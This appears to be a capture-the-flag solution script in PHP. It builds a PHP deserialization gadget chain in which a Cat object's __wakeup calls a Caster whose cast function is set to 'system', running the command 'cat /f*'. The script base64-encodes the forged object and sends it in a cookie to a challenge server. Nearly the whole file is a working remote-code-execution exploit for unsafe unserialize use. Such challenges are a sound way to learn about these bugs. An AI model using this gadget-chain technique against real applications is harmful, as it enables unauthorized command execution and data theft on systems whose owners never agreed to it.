<?php
    class Magic {
        function cast($spell) {
            echo "<script>alert('MAGIC, $spell!');</script>";
        }
    }

    // Useless class?
    class Caster {
        public $cast_func = 'intval';
        function cast($val) {
            return ($this->cast_func)($val);
        }
    }


    class Cat {
        public $magic;
        public $spell;
        function __construct($spell) {
            $this->magic = new Magic();
            $this->spell = $spell;
        }
        function __wakeup() {
            echo "Cat Wakeup!\n";
            $this->magic->cast($this->spell);
        }
    }

    $cat = new Cat("spell");
    echo serialize($cat) . "\n";

    # Change O:3:"Cat":2:{s:5:"magic";O:5:"Magic":0:{}s:5:"spell";s:5:"spell";}
    # To     O:3:"Cat":2:{s:5:"magic";O:6:"Caster":1:{s:9:"cast_func";s:6:"system";}s:5:"spell";s:$len:"$cmd";}
    $cmd = "cat /f*";
    $len = strlen($cmd);
    $badcat = "O:3:\"Cat\":2:{s:5:\"magic\";O:6:\"Caster\":1:{s:9:\"cast_func\";s:6:\"system\";}s:5:\"spell\";s:$len:\"$cmd\";}";
    $badcat = base64_encode($badcat);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://h4ck3r.quest:8602/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($ch, CURLOPT_COOKIE, "cat=$badcat");

    $output = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    echo $output . "\n";
?>